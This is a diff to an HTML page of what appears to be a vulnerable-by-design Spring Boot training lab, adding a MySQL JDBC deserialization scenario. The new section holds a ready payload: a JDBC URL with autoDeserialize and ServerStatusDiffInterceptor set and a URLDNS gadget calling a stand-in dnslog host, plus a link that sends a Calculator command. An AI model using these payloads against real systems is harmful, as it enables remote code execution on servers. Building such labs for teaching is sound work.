@@ -8,7 +8,10 @@
         <div class="layui-row layui-col-space15">
             <div class="layui-col-md12">
                 <fieldset class="layui-elem-field layui-field-title">
-                    <legend style="color: rgb(30 159 255)">SpringBoot框架 - 相关漏洞</legend>
+                    <legend>
+                        <a style="color: rgb(30 159 255)" class="jdbc">SpringBoot框架 - 相关漏洞</a>
+                    </legend>
+
                     <blockquote class="layui-elem-quote layui-quote-nm"
                                 style="font-size: 15px;background-color: #a7deefab;box-shadow: 0 .125rem .25rem rgba(0, 0, 0, .075) !important">
                         <p>
@@ -21,7 +24,14 @@
             <div class="layui-col-md12" style="margin-top: 10px">
                 <div class="layui-row layui-col-space15">
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-bug"> 漏洞情景：Swagger UI 敏感接口泄漏</span></h1>
+                        <h1 style="display: flex; justify-content: space-between; align-items: center;height: 33.5px">
+                            <span class="iconfont icon-bug"> 漏洞场景：Swagger UI 敏感接口泄漏</span>
+                            <span class="iconfont icon-liuliang1">
+                                <a href="/other/datapackage/springboot/swagger_ui.pcapng" download="swagger_ui.pcapng"
+                                   style="margin-right: 19px;color: #00bb00">流量分析</a>
+                            </span>
+                        </h1>
+
                         <div class="layui-tab layui-tab-brief">
                             <div class="layui-tab-content">
 
@@ -48,7 +58,9 @@
                     </div>
 
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-code">  缺陷代码</span></h1>
+                        <h1 style="display: flex; align-items: center; height: 33.5px;">
+                            <span class="iconfont icon-code" style="height: 22.5px;">缺陷代码</span>
+                        </h1>
                         <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">
                             <div class="code-editor" id="springBootSwagger">
                             </div>
@@ -60,7 +72,13 @@
             <div class="layui-col-md12" style="margin-top: 10px">
                 <div class="layui-row layui-col-space15">
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-bug"> 漏洞情景：SpringBoot Actuator 敏感端点泄漏</span></h1>
+                        <h1 style="display: flex; justify-content: space-between; align-items: center;height: 33.5px">
+                            <span class="iconfont icon-bug"> SpringBoot Actuator 敏感端点泄漏</span>
+                            <span class="iconfont icon-liuliang1">
+                                <a href="/other/datapackage/springboot/actuator.pcapng" download="actuator.pcapng"
+                                   style="margin-right: 19px;color: #00bb00">流量分析</a>
+                            </span>
+                        </h1>
                         <div class="layui-tab layui-tab-brief">
                             <div class="layui-tab-content">
 
@@ -87,7 +105,9 @@
                     </div>
 
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-code">  缺陷代码</span></h1>
+                        <h1 style="display: flex; align-items: center; height: 33.5px;">
+                            <span class="iconfont icon-code" style="height: 22.5px;">缺陷代码</span>
+                        </h1>
                         <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">
                             <div class="code-editor" id="springBootActuator">
                             </div>
@@ -99,7 +119,13 @@
             <div class="layui-col-md12" style="margin-top: 10px">
                 <div class="layui-row layui-col-space15">
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-bug"> 漏洞情景：Druid 配置不当</span></h1>
+                        <h1 style="display: flex; justify-content: space-between; align-items: center;height: 33.5px">
+                            <span class="iconfont icon-bug"> 漏洞情景：Druid 配置不当</span>
+                            <span class="iconfont icon-liuliang1">
+                                <a href="/other/datapackage/springboot/druid.pcapng" download="druid.pcapng"
+                                   style="margin-right: 19px;color: #00bb00">流量分析</a>
+                            </span>
+                        </h1>
                         <div class="layui-tab layui-tab-brief">
                             <div class="layui-tab-content">
 
@@ -119,7 +145,7 @@
                                         <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
                                         <div class="layui-card-body layui-text layadmin-text">
                                             <pre style="color: #28333e;font-size: 15px;">  Apache Druid 是阿里开源的高性能连接池和实时分析分布式数据存储系统，专为大规模时序数据和事件流分析设计，具有快速查询、低延迟写入及横向扩展能力
-  在导入Druid依赖时，没有在application.yml中添加配置(或忘记配置账号密码)，此时Druid可以未授权访问，攻击者可直接获取websession信息，进行session爆破，以及通过weburi获取敏感信息路径，进行Fuzz攻击</pre>
+  在导入Druid依赖时，没有在application.yml中添加配置或忘记配置账号密码(当然弱口令也是一个常见问题)，此时Druid可以未授权访问，攻击者可直接获取websession信息，进行session爆破，以及通过weburi获取敏感信息路径，进行Fuzz攻击</pre>
                                         </div>
                                     </div>
                                 </div>
@@ -128,13 +154,88 @@
                     </div>
 
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-code">  缺陷代码</span></h1>
+                        <h1 style="display: flex; align-items: center; height: 33.5px;">
+                            <span class="iconfont icon-code" style="height: 22.5px;">缺陷代码</span>
+                        </h1>
                         <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">
                             <div class="code-editor" id="springBootDruid">
                             </div>
                         </div>
                     </div>
 
+                </div>
+            </div>
+
+            <div class="layui-col-md12" style="margin-top: 10px">
+                <div class="layui-row layui-col-space15">
+                    <div class="layui-col-md6">
+                        <h1 style="display: flex; justify-content: space-between; align-items: center;height: 33.5px">
+                            <span class="iconfont icon-bug">  漏洞场景：MYSQL JDBC反序列</span>
+                            <span class="iconfont icon-liuliang1">
+                                <a href="/other/datapackage/springboot/mysql_jdbc.pcapng" download="mysql_jdbc.pcapng"
+                                   style="margin-right: 19px;color: #00bb00">流量分析</a>
+                            </span>
+
+                        </h1>
+                        <div class="layui-tab layui-tab-brief">
+                            <div class="layui-tab-content">
+                                <div class="layui-tab-item layui-show">
+                                    <blockquote class="layui-elem-quote main_btn">
+                                        <form class="layui-form" style="display: flex; justify-content: space-between;">
+                                            <div style="display: flex; align-items: center;">
+                                                <p>
+                                                    <a target="_blank" style="color: red" href="/springboot/vul?url=jdbc:mysql://ip:port/test?characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_URLDNS_http://xxx.dnslog.cn&password=qwe">
+                                                        Fake-MySQL-Server漏洞测试
+                                                    </a> |
+                                                    <a target="_blank" style="color: red" href="/springboot/insert?command=open%20-a%20Calculator">
+                                                        反序列化命令
+                                                    </a>
+                                                </p>
+
+                                            </div>
+                                            <div style="display: flex; align-items: center;">
+                                                <button class="layui-btn layui-btn-normal"
+                                                        style="width: 100px; margin-left: 10px;"
+                                                        lay-filter="vul-jdbc" lay-submit="">
+                                                    <span class="iconfont icon-zhihang">Run</span>
+                                                </button>
+                                            </div>
+                                        </form>
+                                    </blockquote>
+                                </div>
+
+                                <div class="layui-col-md12">
+                                    <div class="layui-card">
+                                        <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
+                                        <div class="layui-card-body layui-text layadmin-text">
+                                            <pre style="color: #28333e;font-size: 15px;">MySQL JDBC反序列化漏洞分析：https://xz.aliyun.com/t/8159
+该漏洞涉及的链路较为复杂，建议感兴趣的朋友使用IDEA进行调试分析，可以尝试测试 DNSLOG、CC、CB链……</pre>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="layui-col-md12">
+                                    <div class="layui-card">
+                                        <div class="layui-card-header"><i class="fa fa-warning icon-output"></i>测试结果
+                                        </div>
+                                        <div class="layui-card-body layui-text layadmin-text">
+                                            <pre id="vul-jdbc-result" style="color: red;font-size: 15px;"></pre>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="layui-col-md6">
+                        <h1 style="display: flex; align-items: center; height: 33.5px;">
+                            <span class="iconfont icon-code" style="height: 22.5px;">缺陷代码</span>
+                        </h1>
+                        <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">
+                            <div class="code-editor" id="jdbcDeserial"></div>
+                        </div>
+                    </div>
                 </div>
             </div>
 
@@ -150,10 +251,12 @@
         layui.use(['layer', 'miniTab', 'common', 'form'], function () {
             var $ = layui.jquery,
                 layer = layui.layer,
+                common = layui.common,
                 miniTab = layui.miniTab;
             miniTab.listen();
             layer.msg("SpringBoot框架-相关漏洞")
 
+            common.formListenFun("vul-jdbc", "", "/springboot/jdbc", "vul-jdbc-result", "get");
 
             var cmConfig = {
                 lineNumbers: true,
@@ -175,8 +278,31 @@
             CodeMirror(document.getElementById("springBootDruid"), Object.assign({}, cmConfig, {
                 value: springBootDruid
             }));
+            CodeMirror(document.getElementById("jdbcDeserial"), Object.assign({}, cmConfig, {
+                value: JdbcDeserial
+            }));
 
         });
+
+        $('.jdbc').hover(function () {
+            $(this).css('cursor', 'pointer');
+            layer.tips('JDBC反序列化攻击流程', this, {
+                tips: [1, '#0051ff'],
+                time: 2000
+            });
+        });
+
+        $('.jdbc').on('click', function () {
+            layer.open({
+                type: 1,
+                title: false,
+                closeBtn: 1,
+                area: ['996px', '526px'],
+                shadeClose: true,
+                content: '<div style="text-align: center;"><img src="/static/images/vul/jdbc/jdbc.png" style="width: 100%; height: 100%;"></div>'
+            });
+        });
+
     });
 
 
